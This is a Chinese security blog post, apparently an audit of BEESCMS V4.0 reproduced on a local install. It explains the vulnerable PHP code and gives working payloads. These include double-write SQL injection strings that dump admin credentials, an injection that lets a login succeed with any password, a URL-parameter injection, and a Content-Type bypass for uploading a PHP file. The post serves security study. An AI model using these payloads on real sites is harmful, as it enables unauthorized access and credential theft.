@@ -1,0 +1,547 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="web安全的本质最终还得回归到代码层面.
+本专栏博客主要通过复现历史cms的漏洞,来学习,了解以及总结cms中最容易出问题的功能代码.
+代码审计">
+  <meta name="author" content="Noel">
+  <meta name="keywords" content="">
+  
+  <title>beescms代码审计 - Noel&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"n0el4kls.github.io","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>N0el4kLs's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/web_source/shine.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="beescms代码审计">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-11-15 22:44" pubdate>
+        2021年11月15日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      18
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">beescms代码审计</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：4 小时前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <p><em><strong>web安全的本质最终还得回归到代码层面.</strong></em></p>
+<p>本专栏博客主要通过复现历史cms的漏洞,来学习,了解以及总结cms中最容易出问题的功能代码.</p>
+<a href="/2021/11/15/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">代码审计</a>
+
+<span id="more"></span>
+
+<p>BEESCMS代码审计</p>
+<p>[toc]</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>官网地址：<a target="_blank" rel="noopener" href="http://www.beescms.com/">http://www.beescms.com/</a></p>
+<p>如官方所言，beescms的优点如下</p>
+<blockquote>
+<p>PHP+MYSQL，多语言系统，内容模块易扩展，模板风格多样化，模板制作简单功能强大，专业SEO优化，后台操作方便，完全可以满足企业网站、外贸网站、事业单位、教育机构、个人网站使用。</p>
+</blockquote>
+<p>审计工具</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">seay</span>源代码审计系统<br><span class="hljs-attribute">phpstudypro</span><br><span class="hljs-attribute">phpstrom</span><br><span class="hljs-attribute">chrome</span><br><span class="hljs-attribute">beescms</span> 版本V<span class="hljs-number">4</span>.<span class="hljs-number">0</span>_R_<span class="hljs-number">20150708</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="0x01-后台登录界面sql注入"><a href="#0x01-后台登录界面sql注入" class="headerlink" title="0x01 后台登录界面sql注入"></a>0x01 后台登录界面sql注入</h1><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>漏洞代码位于<code>admin/login.php</code>中第40行的<code>elseif($action==&#39;ck_login&#39;)</code>.</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115131448747.png" srcset="/img/loading.gif" lazyload alt="image-20211115131448747"></p>
+<p>首先将<code>$_POST[&#39;user&#39;]</code>以及<code>$_POST[&#39;password&#39;]</code>传入的值传递给<code>fl_value()</code>函数，跟进这个函数,其位于<code>includes/fun.php</code>,具体内容如下:</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115131934091.png" srcset="/img/loading.gif" lazyload alt="image-20211115131934091"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fl_value</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>	<span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$str</span>))&#123;<span class="hljs-keyword">return</span>;&#125;<br>	<span class="hljs-keyword">return</span> preg_replace(<span class="hljs-string">&#x27;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file</span><br><span class="hljs-string">r|outfile/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到这个函数使用<code>preg_replace</code>的方法对传入的值中的sql铭感关键字进行了替换.</p>
+<p>fl_value()外面的函数<code>fl_html()</code>的具体内容为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fl_html</span>(<span class="hljs-params"><span class="hljs-variable">$st</span></span>)</span>&#123;<br>	<span class="hljs-keyword">return</span> htmlspecialchars(<span class="hljs-variable">$st</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>其主要目的对传入的值使用<code>htmlspecialchars()</code>函数，在一定程度上预防了用户的xss.</p>
+<p>继续跟进<code>login.php</code>，在59行发现<code>check_login()</code>函数，跟进，函数体在<code>includes/fun.php</code>中的第970行。其具体内容为</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115133743184.png" srcset="/img/loading.gif" lazyload alt="image-20211115133743184"></p>
+<p>可以看到在<code>971</code>行,直接将传入的<code>$user</code>进行了数据库语句拼接:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$rel</span>=<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;mysql&#x27;</span>]-&gt;fetch_asc(<span class="hljs-string">&quot;select id,admin_name,admin_password,admin_purview,is_disable from &quot;</span>.DB_PRE.<span class="hljs-string">&quot;admin where admin_name=&#x27;&quot;</span>.<span class="hljs-variable">$user</span>.<span class="hljs-string">&quot;&#x27; limit 0,1&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>结合前面的的<code>fl_value()</code>,可以使用双写绕过从而造成<code>sql注入</code>.</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><em><strong>一 报错注入</strong></em></p>
+<p>输入单引号回回显sql报错语句，于是这里尝试使用报错注入</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115141944516.png" srcset="/img/loading.gif" lazyload alt="image-20211115141944516"></p>
+<p>根据上面<code>fl_value</code>的替换，构造payload:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; uni union <span class="hljs-literal">on</span> selselectect extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(selselectect @@version),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e))#<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115142645430.png" srcset="/img/loading.gif" lazyload alt="image-20211115142645430"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 爆表名</span><br><span class="hljs-attribute">1</span>&#x27; uni union <span class="hljs-literal">on</span> selselectect extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(selselectect group_concat(table_name) fr from om information_schema.tables wh where ere table_schema like database()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e))#<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 爆字段名</span><br><span class="hljs-attribute">1</span>&#x27; uni union <span class="hljs-literal">on</span> selselectect extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(selselectect group_concat(column_name) fr from om information_schema.columns wh where ere table_schema like database() an and d table_name like &#x27;bees_admin&#x27;),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e))#<br><br></code></pre></td></tr></table></figure>
+
+<p><em><strong>其实上两步可以忽略，因为报错信息已经给出了关键表名和字段名</strong></em></p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment"># 爆内容</span><br><span class="hljs-comment">## 用户名</span><br><span class="hljs-number">1</span>&#x27; uni union <span class="hljs-keyword">on</span> selselectect extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(selselectect admin_name fr <span class="hljs-keyword">from</span> om bees_admin),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">#</span><br>PATH syntax <span class="hljs-keyword">error</span>: &#x27;~admin~&#x27;<br><br><br><span class="hljs-comment">## 密码</span><br><span class="hljs-number">1</span>&#x27; uni union <span class="hljs-keyword">on</span> selselectect extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(selselectect admin_password fr <span class="hljs-keyword">from</span> om bees_admin),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">#</span><br>PATH syntax <span class="hljs-keyword">error</span>: &#x27;~<span class="hljs-number">21232</span>f297a57a5a743894a0e4a801fc&#x27;<br>从这里可以看到其实返回结果并不完全，使用right()函数获取未显示部分<br><span class="hljs-number">1</span>&#x27; uni union <span class="hljs-keyword">on</span> selselectect extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(selselectect right((selselectect admin_password fr <span class="hljs-keyword">from</span> om bees_admin),<span class="hljs-number">10</span>)),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">#</span><br>PATH syntax <span class="hljs-keyword">error</span>: &#x27;~<span class="hljs-number">0e4</span>a801fc3~&#x27;<br>最终结果：<span class="hljs-number">21232</span>f297a57a5a743894a0e4a801fc3<br>解密结果：admin<br></code></pre></td></tr></table></figure>
+
+
+
+<p><em><strong>二 任意密码登录</strong></em></p>
+<p>在<code>check_login()</code>中可以看到会将用户的输入的密码进行md5加密后在与数据库查询结果进行比较.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$password</span>=md5(<span class="hljs-variable">$password</span>);<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span>!=<span class="hljs-variable">$rel</span>[<span class="hljs-string">&#x27;admin_password&#x27;</span>])&#123;<br>		msg(<span class="hljs-string">&quot;输入的密码不正确&quot;</span>);<br>	&#125;<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$rel</span>[<span class="hljs-string">&#x27;is_disable&#x27;</span>])&#123;<br>		msg(<span class="hljs-string">&#x27;该账号已经被锁定,无法登陆&#x27;</span>);<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里可以通过注入从而实现任意密码登录,前提得有一个已知用户名，构造payload：</p>
+<figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs capnproto">用户名为：admin&#x27; a and nd <span class="hljs-number">0</span> uni <span class="hljs-keyword">union</span> <span class="hljs-keyword">on</span> selselectect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,md5(&#x27;<span class="hljs-number">123</span>&#x27;),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>;<span class="hljs-comment">#</span><br>密码为：<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115155644431.png" srcset="/img/loading.gif" lazyload alt="image-20211115155644431"></p>
+<p>可以看到成功跳转，绕过登录</p>
+<h1 id="0x02-后台目录sql注入"><a href="#0x02-后台目录sql注入" class="headerlink" title="0x02 后台目录sql注入"></a>0x02 后台目录sql注入</h1><h2 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h2><p>漏洞代码位于<code>admin/admin_catagory.php</code>中的<code>第162行</code>.</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115170507090.png" srcset="/img/loading.gif" lazyload alt="image-20211115170507090"></p>
+<p>可以看到这里进行了一次sql语句拼接，跟踪以下遍历<code>$parent</code>.其定义在当前文件的<code>第16行</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115170652305.png" srcset="/img/loading.gif" lazyload alt="image-20211115170652305"></p>
+<p>可以看到这里是直接将<code>$_REQUEST[&#39;parent&#39;]</code>接收到的值拼接到了sql语句，没有进行任何过滤，从而造成sql注入.</p>
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>登录后台，访问<code>http://localhost/beescms/admin/admin_catagory.php/?parent=1%27</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115171051851.png" srcset="/img/loading.gif" lazyload alt="image-20211115171051851"></p>
+<p>利用报错注入拿以下数据库文件的存储路径<code>http://localhost/beescms/admin/admin_catagory.php?parent=1%20union%20select%20extractvalue(1,concat(0x7e,@@datadir,0x7e))#</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115171438368.png" srcset="/img/loading.gif" lazyload alt="image-20211115171438368"></p>
+<p>直接上sqlmap也行，这里就不再做演示了。</p>
+<h1 id="0x04-后台留言删除处存在sql注入"><a href="#0x04-后台留言删除处存在sql注入" class="headerlink" title="0x04 后台留言删除处存在sql注入"></a>0x04 后台留言删除处存在sql注入</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞代码位于<code>admin/admin_book.php</code>中第100行</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115201324668.png" srcset="/img/loading.gif" lazyload alt="image-20211115201324668"></p>
+<p>可以看到这行是一个sql语句，变量<code>$v</code>来自<code>$_POST[&#39;all&#39;]</code>，且未对传入内容进行任何判断,存在恶意用户构造恶意参数造成sql注入</p>
+<h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里使用报错注入得到数据库用户名</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115201740928.png" srcset="/img/loading.gif" lazyload alt="image-20211115201740928"></p>
+<h1 id="0x05-后台任意文件上传"><a href="#0x05-后台任意文件上传" class="headerlink" title="0x05 后台任意文件上传"></a>0x05 后台任意文件上传</h1><h2 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h2><p>漏洞代码位于<code>admin/upload.php</code>中的第36行中的if语句</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115160459547.png" srcset="/img/loading.gif" lazyload alt="image-20211115160459547"></p>
+<p>36-43行主要判断了是否上传上传文件以及设置一些初始属性，核心漏洞代码在第44行，可以看到是将传入的文件带入了一个叫<code>up_img()</code>的函数，跟进这个函数。其函数体在<code>includes/fun.php</code>第571行</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115163316558.png" srcset="/img/loading.gif" lazyload alt="image-20211115163316558"></p>
+<p>调试发现，其对上传的只使用了一个<code>in_array()</code>判断MIME</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115163206696.png" srcset="/img/loading.gif" lazyload alt="image-20211115163206696"></p>
+<p>所以可以使用bp抓包修改MIME进行绕过。</p>
+<h2 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>对上传文件进行抓包，修改<code>Content-Type</code>为<code>image/png</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115163737723.png" srcset="/img/loading.gif" lazyload alt="image-20211115163737723"></p>
+<p>放行包，回到上传文件加，可以看到此时多了一个文件，上传成功.</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115164135676.png" srcset="/img/loading.gif" lazyload alt="image-20211115164135676"></p>
+<p>访问，<code>http://localhost/beescms/upload/img/202111151640275039.php</code>,成功执行代码</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115164308004.png" srcset="/img/loading.gif" lazyload alt="image-20211115164308004"></p>
+<h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h1><p>上手的第一个cms,能看出15年那时开发人员的安全意识还是较弱。</p>
+<p>此cms出现的问题主要为sql注入，问题产生的主要原因为：后端未对用户传入的参数进行合理判断以及处理，甚至还出现了直接将用户的输入拼接到sql语句.</p>
+<h1 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10480">https://xz.aliyun.com/t/10480</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">cms代码审计</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/11/15/reateam_1/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">redteam_1</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/11/15/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/">
+                        <span class="hidden-mobile">代码审计总结</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
